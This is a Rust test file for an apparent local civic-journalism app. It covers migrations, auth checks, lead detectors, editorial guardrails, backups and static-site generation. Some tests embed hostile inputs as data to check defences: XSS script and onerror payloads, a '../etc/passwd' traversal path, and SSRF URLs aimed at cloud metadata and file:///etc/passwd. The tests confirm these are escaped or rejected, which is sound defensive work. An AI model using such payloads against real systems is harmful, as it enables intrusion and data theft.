// core/tests.rs
#![allow(clippy::module_inception)]

#[cfg(test)]
mod tests {
    use chrono::Utc;
    use rusqlite::Connection;
    use std::fs;
    use std::sync::{Arc, Mutex};
    use tempfile::tempdir;

    use crate::core::auth::{is_valid_host, is_valid_origin};
    use crate::core::backups::{restore_backup, save_backup};
    use crate::core::compiler::compile_static_site;
    use crate::core::db::*;
    use crate::core::detectors::run_detectors;
    use crate::core::guardrails::run_guardrails_check;
    use crate::core::migrations::{get_current_version, get_expected_version, run_migrations};

    // 1. Migration Tests
    #[test]
    fn test_migrations() {
        let mut conn = Connection::open_in_memory().unwrap();

        // Initial run should apply all migrations
        let res = run_migrations(&mut conn);
        assert!(res.is_ok(), "Migrations failed to execute: {:?}", res);

        let version = get_current_version(&conn).unwrap();
        assert_eq!(version, get_expected_version());

        // Running migrations again should be a safe, clean no-op
        let res_noop = run_migrations(&mut conn);
        assert!(
            res_noop.is_ok(),
            "Second migration run failed: {:?}",
            res_noop
        );
        let version_after = get_current_version(&conn).unwrap();
        assert_eq!(version_after, get_expected_version());
    }

    // 2. Auth Tests
    #[test]
    fn test_auth_checks() {
        // Host checks
        assert!(is_valid_host("127.0.0.1:12053"));
        assert!(!is_valid_host("localhost:12053"));
        assert!(is_valid_host("  127.0.0.1:12053  ")); // Whitespace cleanup
        assert!(!is_valid_host("google.com"));
        assert!(!is_valid_host("127.0.0.1:8080"));

        // Origin checks
        assert!(is_valid_origin("chrome-extension://someuniqueextensionid"));
        assert!(!is_valid_origin("null"));
        assert!(!is_valid_origin("http://evilwebsite.com"));
        assert!(!is_valid_origin("https://localhost:12053"));
    }

    // 3. Detector Tests
    #[test]
    fn test_osint_detectors() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();

        // Setup test sources
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Brighton Town Council".to_string(),
                url: "https://brighton.gov/agenda.xml".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();

        // 3a. Test Money Threshold (fires > $250k)
        let ev_money_high = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: Some("https://brighton.gov/agenda.xml".to_string()),
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Approved contract for $350,000 road maintenance project.".to_string(),
                content_hash: "hash_money_high".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();

        let ev_money_low = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: Some("https://brighton.gov/agenda.xml".to_string()),
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Approved contract for $45,000 for park benches.".to_string(),
                content_hash: "hash_money_low".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();

        let profile_json = r#"{"money_threshold": 250000.0, "watchlist": ["John Doe"]}"#;

        let _new_leads =
            run_detectors(&conn, &[ev_money_high, ev_money_low], profile_json).unwrap();

        // Assert only the high amount lead was created (plus the New Primary Record lead which fires automatically for primary records)
        let leads = list_leads(&conn).unwrap();

        // We expect:
        // 1. "New Primary Record" for ev_money_high
        // 2. "Money Threshold" for ev_money_high
        // 3. "New Primary Record" for ev_money_low
        assert!(leads
            .iter()
            .any(|l| l.detector_name == "Money Threshold" && l.why.contains("$350,000")));
        assert!(!leads
            .iter()
            .any(|l| l.detector_name == "Money Threshold" && l.why.contains("$45,000")));

        // 3b. Test Watchlist Detector
        let ev_watchlist = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: Some("https://brighton.gov/agenda.xml".to_string()),
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Council met with contractor John Doe regarding landfill operations."
                    .to_string(),
                content_hash: "hash_watchlist".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();

        let _new_leads2 = run_detectors(&conn, &[ev_watchlist], profile_json).unwrap();
        let leads_after = list_leads(&conn).unwrap();
        assert!(leads_after
            .iter()
            .any(|l| l.detector_name == "Watchlist Hit" && l.why.contains("John Doe")));

        // 3c. Test Decision / Vote
        let ev_vote = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: Some("https://brighton.gov/agenda.xml".to_string()),
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "The board unanimously approved the zoning change request.".to_string(),
                content_hash: "hash_vote".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();
        run_detectors(&conn, &[ev_vote], profile_json).unwrap();
        let leads_vote = list_leads(&conn).unwrap();
        assert!(leads_vote
            .iter()
            .any(|l| l.detector_name == "Decision / Vote"));
    }

    // 4. Guardrails Tests
    #[test]
    fn test_guardrails() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();

        // Insert a lead and link to evidence
        let lead_id = insert_lead(
            &conn,
            &Lead {
                id: None,
                detector_name: "Zoning Board".to_string(),
                why: "Zoning change".to_string(),
                confidence: "high".to_string(),
                risk_level: "low".to_string(),
                from_scan_lead_id: None,
                confirmation_checklist: "[]".to_string(),
                created_at: Utc::now().to_rfc3339(),
            },
            &[],
        )
        .unwrap();

        // Draft with missing citation (should warn) and accusatory term (should error)
        let draft_id = insert_draft(&conn, &Draft {
            id: None,
            lead_id: Some(lead_id),
            format: "story".to_string(),
            title: "Accusation Story".to_string(),
            content: "The mayor engaged in corrupt activities during yesterday's budget meeting.\n\nHe refused to answer public comment questions.".to_string(),
            status: "draft_generated".to_string(),
            verification_checklist: "[]".to_string(),
            missing_evidence_notes: None,
            correction_note: None,
            created_at: Utc::now().to_rfc3339(),
            updated_at: Utc::now().to_rfc3339(),
        }).unwrap();

        // DEFAULT is warn-only: an accusatory term without a citation raises a
        // WARNING and is_clean stays true (nothing blocks unless the editor marks
        // a word blocking).
        let report = run_guardrails_check(&conn, draft_id).unwrap();
        assert!(
            report.is_clean,
            "default config must be warn-only (no errors)"
        );
        assert!(
            report
                .issues
                .iter()
                .any(|i| i.category == "Accusatory Language" && i.severity == "warning"),
            "accusatory term should warn by default"
        );
        assert!(
            report
                .issues
                .iter()
                .any(|i| i.category == "Citation Coverage" && i.severity == "warning"),
            "missing-citation paragraph should warn"
        );

        // Editor marks "corrupt" blocking => the same draft now ERRORS.
        let mut cfg = crate::core::guardrails::load_guardrail_config(&conn);
        cfg.blocking = vec!["corrupt".to_string()];
        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
        let report_b = run_guardrails_check(&conn, draft_id).unwrap();
        assert!(!report_b.is_clean, "a blocking word must produce an error");
        assert!(
            report_b
                .issues
                .iter()
                .any(|i| i.category == "Accusatory Language" && i.severity == "error"),
            "marked-blocking accusatory term should error"
        );

        // Legal-naming (presumption of innocence): charge words without "alleged".
        let draft_id2 = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: Some(lead_id),
                format: "story".to_string(),
                title: "Arrest Story".to_string(),
                content: "Police arrested a clerk for embezzlement at city hall (evidence:101)."
                    .to_string(), // Has citation, but lacks "alleged"
                status: "draft_generated".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();

        // With only "corrupt" blocking, legal-naming WARNS by default.
        let report2 = run_guardrails_check(&conn, draft_id2).unwrap();
        assert!(
            report2
                .issues
                .iter()
                .any(|i| i.category == "Legal Naming" && i.severity == "warning"),
            "legal-naming should warn by default"
        );

        // Editor marks "arrested" blocking => legal-naming ERRORS on missing 'alleged'.
        cfg.blocking = vec!["arrested".to_string()];
        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
        let report2b = run_guardrails_check(&conn, draft_id2).unwrap();
        assert!(!report2b.is_clean);
        assert!(
            report2b
                .issues
                .iter()
                .any(|i| i.category == "Legal Naming" && i.severity == "error"),
            "marked-blocking charge word should error on missing 'alleged'"
        );
    }

    // 5. Backups Tests
    #[test]
    fn test_backups() {
        let temp_dir = tempdir().unwrap();
        let db_file_path = temp_dir.path().join("live.db");
        let backup_file_path = temp_dir.path().join("backup.db");

        // 1. Initialize live DB and write some records
        let conn = init_db(db_file_path.to_str().unwrap()).unwrap();
        insert_source(
            &conn,
            &Source {
                id: None,
                name: "Original Source".to_string(),
                url: "https://orig.gov".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();

        // 2. Save Backup
        save_backup(&conn, backup_file_path.to_str().unwrap()).unwrap();
        assert!(backup_file_path.exists());

        // 3. Mutate live DB (insert new item)
        insert_source(
            &conn,
            &Source {
                id: None,
                name: "Mutated Source".to_string(),
                url: "https://mutate.gov".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();

        let sources_mutated = list_sources(&conn).unwrap();
        assert_eq!(sources_mutated.len(), 2);

        // 4. Restore DB
        let db_conn_arc = Arc::new(Mutex::new(conn));
        restore_backup(
            &db_conn_arc,
            backup_file_path.to_str().unwrap(),
            db_file_path.to_str().unwrap(),
        )
        .unwrap();

        // 5. Verify restored state (should only have the original source)
        {
            let conn_after = db_conn_arc.lock().unwrap();
            let sources_restored = list_sources(&conn_after).unwrap();
            assert_eq!(sources_restored.len(), 1);
            assert_eq!(sources_restored[0].name, "Original Source");

            // C-2 regression: foreign-key enforcement is per-connection and must
            // survive a restore (the live handle is reopened during restore).
            let fk_on: i64 = conn_after
                .query_row("PRAGMA foreign_keys;", [], |r| r.get(0))
                .unwrap();
            assert_eq!(fk_on, 1, "foreign_keys must be ON after restore (C-2)");
        }

        // 6. Test Corrupt File Restore (Should reject and keep live DB safe)
        let corrupt_path = temp_dir.path().join("corrupt.db");
        fs::write(&corrupt_path, b"garbage text data").unwrap();

        let restore_res = restore_backup(
            &db_conn_arc,
            corrupt_path.to_str().unwrap(),
            db_file_path.to_str().unwrap(),
        );
        assert!(restore_res.is_err());

        // Assert live DB remains intact
        {
            let conn_final = db_conn_arc.lock().unwrap();
            let sources_final = list_sources(&conn_final).unwrap();
            assert_eq!(sources_final.len(), 1);
            assert_eq!(sources_final[0].name, "Original Source");
        }
    }

    // 6. Compiler and Site Gen Tests (Milestone integration test)
    #[test]
    fn test_compiler_static_site() {
        let temp_dir = tempdir().unwrap();
        let live_db_path = temp_dir.path().join("live.db");
        let site_output_path = temp_dir.path().join("dist");

        let conn = init_db(live_db_path.to_str().unwrap()).unwrap();

        // Setup test records
        let source_id = insert_source(
            &conn,
            &Source {
                id: None,
                name: "Planning Commission".to_string(),
                url: "https://planning.gov".to_string(),
                r#type: "primary_record".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();

        let ev_id = insert_evidence_item(
            &conn,
            &EvidenceItem {
                id: None,
                source_id,
                url: Some("https://planning.gov/minutes_12.html".to_string()),
                fetched_at: Utc::now().to_rfc3339(),
                excerpt: "Commission approved zoning change request for building C.".to_string(),
                content_hash: "hash_commission".to_string(),
                entities: "[]".to_string(),
            },
        )
        .unwrap();

        let lead_id = insert_lead(
            &conn,
            &Lead {
                id: None,
                detector_name: "Decision / Vote".to_string(),
                why: "Approved zoning change for building C.".to_string(),
                confidence: "high".to_string(),
                risk_level: "low".to_string(),
                from_scan_lead_id: None,
                confirmation_checklist: "[]".to_string(),
                created_at: Utc::now().to_rfc3339(),
            },
            &[ev_id],
        )
        .unwrap();

        // Create published draft
        let draft_id = insert_draft(&conn, &Draft {
            id: None,
            lead_id: Some(lead_id),
            format: "investigation".to_string(), // maps to 'stories' subfolder
            title: "Zoning Board Approves New Building C Expansion".to_string(),
            content: "In yesterday's meeting, the commission formally approved zoning request for [Building C](evidence:1).\n\nThis marks a significant expansion plan.".to_string(),
            status: "published".to_string(), // MUST be published to compile
            verification_checklist: "[]".to_string(),
            missing_evidence_notes: None,
            correction_note: None,
            created_at: Utc::now().to_rfc3339(),
            updated_at: Utc::now().to_rfc3339(),
        }).unwrap();

        // RE-AUDIT M1: the publish sink now requires a recorded human attestation.
        crate::core::db::attest_draft(&conn, draft_id, "Test Editor").unwrap();

        let profile_json = r#"{"site_title": "Local Observer", "site_subtitle": "Evidence first", "about_text": "About Observer", "ethics_text": "Ethics", "how_we_report_text": "How We Report"}"#;

        // Compile
        compile_static_site(&conn, site_output_path.to_str().unwrap(), profile_json).unwrap();

        // Assert files are written correctly
        assert!(site_output_path.join("styles.css").exists());
        assert!(site_output_path.join("print.css").exists());
        assert!(site_output_path.join("index.html").exists());
        assert!(site_output_path.join("about.html").exists());
        assert!(site_output_path.join("ethics.html").exists());
        assert!(site_output_path.join("how-we-report.html").exists());
        assert!(site_output_path.join("corrections.html").exists());
        assert!(site_output_path.join("feed.xml").exists());

        // Assert story subfolder file exists
        let post_html_path = site_output_path
            .join("stories")
            .join(format!("{}.html", draft_id));
        assert!(
            post_html_path.exists(),
            "Compiled post HTML path missing: {:?}",
            post_html_path
        );

        // Read compiled post contents and verify citations have been converted to anchors
        let content = fs::read_to_string(post_html_path).unwrap();
        assert!(
            content.contains("Local Observer"),
            "Site title placeholder fail"
        );
        assert!(
            content.contains("href=\"#evidence-1\""),
            "Citation replacement failed! Href is not pointing to evidence anchor."
        );
        assert!(
            content.contains("id=\"evidence-1\""),
            "Citations section missing evidence ID anchor tag."
        );
    }

    // 7. DuckDuckGo Auto-Discovery HTML Parser Test
    #[test]
    fn test_parse_duckduckgo_html() {
        use crate::core::discovery::parse_duckduckgo_html;
        let mock_html = r#"
            <html>
            <body>
            <div class="result">
                <h2 class="result__title">
                    <a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fwww.brightonco.gov%2Fagendacenter&amp;rut=123">Agenda Center • Brighton, CO</a>
                </h2>
            </div>
            <div class="result">
                <h2 class="result__title">
                    <a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Freddit.com%2Fr%2Fbrightonco&amp;rut=456"><b>Brighton</b> Reddit</a>
                </h2>
            </div>
            </body>
            </html>
        "#;
        let results = parse_duckduckgo_html(mock_html).unwrap();
        assert_eq!(results.len(), 2);
        assert_eq!(results[0].0, "Agenda Center • Brighton, CO");
        assert_eq!(results[0].1, "https://www.brightonco.gov/agendacenter");
        assert_eq!(results[1].0, "Brighton Reddit");
        assert_eq!(results[1].1, "https://reddit.com/r/brightonco");
    }
    #[test]
    fn test_compiler_xss_safe() {
        let conn = init_db("file:test_compiler_xss_safe?mode=memory&cache=shared").unwrap();
        let temp_dir = tempdir().unwrap();

        // Use insert_source so we have a source for the lead
        let _source_id = crate::core::db::insert_source(
            &conn,
            &crate::core::db::Source {
                id: None,
                name: "Test Source".to_string(),
                url: "<script>alert(1)</script>".to_string(), // Source URL with XSS
                r#type: "rss".to_string(),
                tier: "official_record".to_string(),
                status: "online".to_string(),
                last_success_at: None,
                last_failed_at: None,
                last_scraped: None,
            },
        )
        .unwrap();

        let lead_id = crate::core::db::insert_lead(
            &conn,
            &crate::core::db::Lead {
                id: None,
                detector_name: "test".to_string(),
                why: "<script>alert(1)</script>".to_string(),
                confidence: "high".to_string(),
                risk_level: "low".to_string(),
                from_scan_lead_id: None,
                confirmation_checklist: "[]".to_string(),
                created_at: chrono::Utc::now().to_rfc3339(),
            },
            &[],
        )
        .unwrap();

        let draft_id = crate::core::db::insert_draft(
            &conn,
            &crate::core::db::Draft {
                id: None,
                lead_id: Some(lead_id),
                format: "story".to_string(),
                title: "<script>alert(1)</script>".to_string(),
                content: "Hello <script>alert(1)</script>".to_string(),
                status: "published".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: Some("<script>alert(1)</script>".to_string()),
                created_at: chrono::Utc::now().to_rfc3339(),
                updated_at: chrono::Utc::now().to_rfc3339(),
            },
        )
        .unwrap();

        // RE-AUDIT M1: the publish sink requires a recorded human attestation.
        crate::core::db::attest_draft(&conn, draft_id, "Test Editor").unwrap();

        crate::core::db::insert_published_post(
            &conn,
            &crate::core::db::PublishedPost {
                id: None,
                draft_id,
                file_path: "stories/1.html".to_string(),
                url: "http://example.com/stories/1.html".to_string(),
                correction_history: String::new(),
                published_at: chrono::Utc::now().to_rfc3339(),
            },
        )
        .unwrap();

        crate::core::compiler::compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}")
            .unwrap();
        let html = std::fs::read_to_string(temp_dir.path().join("index.html")).unwrap();

        // Assertions
        assert!(html.contains("&lt;script&gt;"));
        assert!(!html.contains("<script"));
        assert!(!html.contains("onerror="));

        let html2 = std::fs::read_to_string(temp_dir.path().join("stories/1.html")).unwrap();
        assert!(html2.contains("&lt;script&gt;"));
        assert!(!html2.contains("<script"));
        assert!(!html2.contains("onerror="));
    }

    #[test]
    fn test_compiler_xss_safe_profile_fields() {
        // ENG-002: author-controlled CommunityProfile fields (site_title,
        // site_subtitle, about_text) are interpolated into every generated page
        // and the RSS feed. They must be entity-encoded in all sinks, not just
        // the draft-derived fields covered by test_compiler_xss_safe (which uses
        // an empty profile and never exercises these paths).
        let conn = init_db("file:test_compiler_xss_safe_profile?mode=memory&cache=shared").unwrap();
        let temp_dir = tempdir().unwrap();

        let profile_json = r#"{
            "site_title": "<script>alert('title')</script>",
            "site_subtitle": "<img src=x onerror=alert('sub')>",
            "about_text": "<script>alert('about')</script>",
            "ethics_text": "ok",
            "how_we_report_text": "ok"
        }"#;

        crate::core::compiler::compile_static_site(
            &conn,
            temp_dir.path().to_str().unwrap(),
            profile_json,
        )
        .unwrap();

        // index.html carries site_title/site_subtitle (header) and about_text (sidebar).
        let index_html = std::fs::read_to_string(temp_dir.path().join("index.html")).unwrap();
        assert!(
            index_html.contains("&lt;script&gt;"),
            "profile fields must be entity-encoded in index.html"
        );
        assert!(
            !index_html.contains("<script"),
            "no live <script> tag may form in index.html"
        );
        assert!(
            !index_html.contains("<img"),
            "no live <img> tag may form in index.html"
        );

        // feed.xml carries site_title/site_subtitle in <title>/<description>.
        let feed_xml = std::fs::read_to_string(temp_dir.path().join("feed.xml")).unwrap();
        assert!(
            !feed_xml.contains("<script"),
            "no live <script> tag may form in feed.xml"
        );
        assert!(
            !feed_xml.contains("<img"),
            "no live <img> tag may form in feed.xml"
        );

        // corrections.html and the info pages also interpolate site_title/subtitle.
        let corrections_html =
            std::fs::read_to_string(temp_dir.path().join("corrections.html")).unwrap();
        assert!(
            !corrections_html.contains("<script"),
            "no live <script> tag may form in corrections.html"
        );
    }

    #[test]
    fn test_settings_round_trip() {
        let mut conn = rusqlite::Connection::open_in_memory().unwrap();
        crate::core::migrations::run_migrations(&mut conn).unwrap();

        // set value
        conn.execute(
            "INSERT OR REPLACE INTO settings (key, value) VALUES (?1, ?2)",
            ["test_key", "test_value_1"],
        )
        .unwrap();
        let val1: String = conn
            .query_row(
                "SELECT value FROM settings WHERE key = 'test_key'",
                [],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(val1, "test_value_1");

        // overwrite value
        conn.execute(
            "INSERT OR REPLACE INTO settings (key, value) VALUES (?1, ?2)",
            ["test_key", "test_value_2"],
        )
        .unwrap();
        let val2: String = conn
            .query_row(
                "SELECT value FROM settings WHERE key = 'test_key'",
                [],
                |row| row.get(0),
            )
            .unwrap();
        assert_eq!(val2, "test_value_2");
    }

    // 8. Phase 3 Diagnostics Tests
    #[tokio::test]
    async fn test_gather_diagnostics_has_all_fields() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let db_conn = Arc::new(Mutex::new(conn));
        let temp_dir = tempdir().unwrap();

        let diags =
            crate::core::diagnostics::gather_diagnostics(&db_conn, temp_dir.path().to_path_buf())
                .await
                .unwrap();
        assert!(!diags.app_version.is_empty());
        assert!(!diags.os_name.is_empty());
        assert!(!diags.os_version.is_empty());
        assert!(!diags.tauri_version.is_empty());
        assert_eq!(diags.db_schema_version, get_expected_version() as i64);
        assert_eq!(diags.evidence_count, 0);
        assert_eq!(diags.leads_count, 0);
        assert_eq!(diags.drafts_count, 0);
        assert_eq!(diags.published_posts_count, 0);
    }

    #[tokio::test]
    async fn test_export_diagnostics_writes_valid_json() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let db_conn = Arc::new(Mutex::new(conn));
        let temp_dir = tempdir().unwrap();

        let file_path = temp_dir.path().join("diag.json");
        crate::tauri_cmds::export_diagnostics_inner(
            &db_conn,
            temp_dir.path().to_path_buf(),
            file_path.clone(),
        )
        .await
        .unwrap();

        let content = std::fs::read_to_string(&file_path).unwrap();
        let parsed: crate::core::diagnostics::Diagnostics = serde_json::from_str(&content).unwrap();
        assert!(!parsed.app_version.is_empty());
        assert!(!parsed.os_name.is_empty());
    }

    #[test]
    fn test_export_diagnostics_path_validation_rejects_traversal() {
        let temp_dir = tempdir().unwrap();
        let app_data = temp_dir.path().join("app_data");
        let downloads = temp_dir.path().join("downloads");
        std::fs::create_dir_all(&app_data).unwrap();
        std::fs::create_dir_all(&downloads).unwrap();

        // Good path in app_data
        let good_path = app_data.join("export.json");
        let res = crate::tauri_cmds::validate_export_path(
            app_data.clone(),
            downloads.clone(),
            good_path.to_str().unwrap(),
        );
        assert!(res.is_ok());

        // Good path in downloads
        let good_path2 = downloads.join("export2.json");
        let res2 = crate::tauri_cmds::validate_export_path(
            app_data.clone(),
            downloads.clone(),
            good_path2.to_str().unwrap(),
        );
        assert!(res2.is_ok());

        // Bad path using traversal
        let bad_path = app_data.join("..").join("etc").join("passwd");
        // Ensure parent directory for bad path exists so canonicalize doesn't fail early
        let etc_dir = temp_dir.path().join("etc");
        std::fs::create_dir_all(&etc_dir).unwrap();

        let res_bad = crate::tauri_cmds::validate_export_path(
            app_data.clone(),
            downloads.clone(),
            bad_path.to_str().unwrap(),
        );
        assert!(res_bad.is_err());
        assert_eq!(res_bad.unwrap_err(), "Path is outside allowed directories");
    }
    // 9. Phase 4 Tests
    #[test]
    fn test_source_tier_migration() {
        let mut conn = Connection::open_in_memory().unwrap();
        // Just run migrations and ensure they pass without error
        run_migrations(&mut conn).unwrap();
        // Insert a source to test constraints
        let res = conn.execute("INSERT INTO sources (name, url, type, tier) VALUES ('Test', 'http', 'rss', 'invalid_tier')", []);
        assert!(res.is_err(), "Should fail constraint check");
    }

    #[test]
    fn test_source_tier_backfill_media_lead() {
        let conn = Connection::open_in_memory().unwrap();
        // Create table up to 0005
        conn.execute_batch(include_str!("../../migrations/0001_init.sql"))
            .unwrap();
        conn.execute_batch(include_str!("../../migrations/0003_settings.sql"))
            .unwrap();
        conn.execute_batch(include_str!("../../migrations/0004_source_tier.sql"))
            .unwrap();
        conn.execute_batch(include_str!("../../migrations/0005_daily_scans.sql"))
            .unwrap();

        // Backfill a legacy row
        conn.execute("INSERT INTO sources (name, url, type, tier) VALUES ('Legacy', 'http', 'rss', 'community_signal')", []).unwrap();

        // Run latest migrations
        conn.execute_batch(include_str!(
            "../../migrations/0006_daily_scan_lead_source_nullable.sql"
        ))
        .unwrap();
        conn.execute_batch(include_str!("../../migrations/0007_source_tier_check.sql"))
            .unwrap();

        let count: i32 = conn
            .query_row("SELECT COUNT(*) FROM sources", [], |row| row.get(0))
            .unwrap();
        assert_eq!(count, 1);
    }

    #[test]
    fn test_list_prompts_returns_bundled() {
        let prompts = crate::core::prompts::list_prompts();
        assert!(!prompts.is_empty());
    }

    // TEST-Nit1: resolve the prompt path from CARGO_MANIFEST_DIR (the crate root)
    // rather than a CWD-relative path, mirroring the sidecar fixture loader. This
    // is robust no matter what working directory the test harness runs from.
    fn manifest_path(rel: &str) -> std::path::PathBuf {
        std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(rel)
    }

    #[test]
    fn test_get_prompt_loads_aggregator() {
        let content = std::fs::read_to_string(manifest_path("prompts/aggregator.md")).unwrap();
        assert!(content.contains("original_url"));
    }

    #[test]
    fn test_daily_scan_parses_fixture_response() {
        let response = r#"
        {
          "leads": [
            {
              "title": "Topic",
              "summary": "Sum",
              "original_url": "http"
            }
          ]
        }
        "#;
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        conn.execute(
            "INSERT INTO daily_scan_runs (started_at, run_status) VALUES ('', 'running')",
            [],
        )
        .unwrap();
        conn.execute("INSERT INTO sources (name, url, type, tier) VALUES ('Test', 'http', 'rss', 'community_signal')", []).unwrap();
        crate::core::daily_scan::parse_and_save_scan_response(&conn, 1, response).unwrap();

        let count: i32 = conn
            .query_row("SELECT COUNT(*) FROM daily_scan_leads", [], |row| {
                row.get(0)
            })
            .unwrap();
        assert_eq!(count, 1);
    }

    // ENG-Min4: parse_and_save_scan_response must validate the untrusted,
    // model-asserted `original_url` against the same SSRF/scheme allow-list used
    // for real sources (scraper::validate_source_url) and DROP a blocked target
    // (blank it out) before persisting, so a poisoned/hallucinated LLM link never
    // enters the evidence/lead trail as a verified URL. This is mutation-resistant:
    // the prior fixture test fed only a benign URL and asserted a row count, so
    // deleting the validation gate would leave it green. Here we feed BOTH a benign
    // URL and blocked ones (cloud-metadata IP + file:// scheme), then read the
    // persisted rows back and assert the benign URL is preserved while every
    // blocked URL is stored blank — removing the gate would persist the raw
    // attacker URL and fail this test.
    #[test]
    fn test_daily_scan_drops_blocked_model_urls_keeps_benign() {
        let response = r#"
        {
          "leads": [
            {
              "title": "Benign lead",
              "summary": "A normal civic item",
              "original_url": "https://example.gov/x"
            },
            {
              "title": "Metadata SSRF lead",
              "summary": "Poisoned cloud-metadata link",
              "original_url": "http://169.254.169.254/meta"
            },
            {
              "title": "File scheme lead",
              "summary": "Poisoned local-file link",
              "original_url": "file:///etc/passwd"
            }
          ]
        }
        "#;
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        conn.execute(
            "INSERT INTO daily_scan_runs (started_at, run_status) VALUES ('', 'running')",
            [],
        )
        .unwrap();

        let saved =
            crate::core::daily_scan::parse_and_save_scan_response(&conn, 1, response).unwrap();
        // All three leads are kept (the lead text is preserved); only the bogus
        // URLs are dropped, not the rows.
        assert_eq!(saved, 3, "every lead row should be kept");

        let leads = list_daily_scan_leads(&conn, 1).unwrap();
        assert_eq!(leads.len(), 3);

        let benign = leads
            .iter()
            .find(|l| l.title == "Benign lead")
            .expect("benign lead should be persisted");
        assert_eq!(
            benign.original_url, "https://example.gov/x",
            "the benign, allow-listed URL must be preserved intact"
        );

        let metadata = leads
            .iter()
            .find(|l| l.title == "Metadata SSRF lead")
            .expect("metadata lead row should be persisted");
        assert_eq!(
            metadata.original_url, "",
            "a blocked cloud-metadata URL must be dropped (stored blank), not persisted as a link"
        );

        let file_lead = leads
            .iter()
            .find(|l| l.title == "File scheme lead")
            .expect("file-scheme lead row should be persisted");
        assert_eq!(
            file_lead.original_url, "",
            "a blocked file:// URL must be dropped (stored blank), not persisted as a link"
        );

        // Belt-and-suspenders: the raw attacker strings must appear in NO
        // persisted original_url. If the validation gate were removed, the
        // metadata IP / file path would round-trip here and this would fail.
        assert!(
            leads
                .iter()
                .all(|l| l.original_url != "http://169.254.169.254/meta"
                    && l.original_url != "file:///etc/passwd"),
            "no blocked URL may survive into a persisted original_url"
        );
    }

    // MUTATION-RESISTANT (per Amendments 001/002). Runs on every platform,
    // including Windows: exercises the real model-selection path
    // (get_selected_model_or_fallback) plus the core rewrite logic with an
    // injected fake client, so no Tauri mock_app() is needed (P5-003 resolved).
    #[tokio::test]
    async fn test_plain_language_rewrite_invokes_ollama() {
        let mut conn = Connection::open_in_memory().unwrap();
        crate::core::migrations::run_migrations(&mut conn).unwrap();
        // Insert selected model setting; get_selected_model_or_fallback returns
        // it directly (no network) when present.
        conn.execute(
            "INSERT OR REPLACE INTO settings (key, value) VALUES ('model.selected', 'fake-model')",
            [],
        )
        .unwrap();
        let db_conn: DbConn = Arc::new(Mutex::new(conn));

        let model = crate::tauri_cmds::get_selected_model_or_fallback(&db_conn).await;
        assert_eq!(model, "fake-model");

        struct FakeLlmClient;
        #[async_trait::async_trait]
        impl crate::core::llm::LlmClient for FakeLlmClient {
            async fn call(
                &self,
                model: &str,
                prompt: &str,
                system: &str,
            ) -> Result<String, String> {
                assert_eq!(model, "fake-model");
                assert!(prompt.contains("Rewrite this"));
                assert!(system.contains("summarizer"));
                Ok("Rewritten text".to_string())
            }
        }
        let llm_client: Arc<dyn crate::core::llm::LlmClient> = Arc::new(FakeLlmClient);

        let res =
            crate::core::llm::plain_language_rewrite(&llm_client, &model, "Hello", "story").await;

        assert_eq!(res.unwrap(), "Rewritten text");
    }

    #[test]
    fn test_prompt_schema_drift() {
        // TEST-Nit1: CARGO_MANIFEST_DIR-relative, not CWD-relative.
        let content = std::fs::read_to_string(manifest_path("prompts/aggregator.md")).unwrap();
        // Extract the fenced JSON example block
        let start_idx = content
            .find("```json")
            .expect("Missing ```json in aggregator.md");
        let after_start = &content[start_idx + 7..];
        let end_idx = after_start
            .find("```")
            .expect("Missing closing ``` in aggregator.md");
        let json_str = &after_start[..end_idx].trim();

        let scan_result: crate::core::daily_scan::ScanResult = serde_json::from_str(json_str)
            .expect("Failed to deserialize JSON block from aggregator.md");
        assert!(
            !scan_result.leads.is_empty(),
            "Leads vector should not be empty"
        );

        let lead = &scan_result.leads[0];
        assert!(!lead.title.is_empty(), "Title should not be empty");
        assert!(!lead.summary.is_empty(), "Summary should not be empty");
        assert!(
            !lead.original_url.is_empty(),
            "Original URL should not be empty"
        );
    }

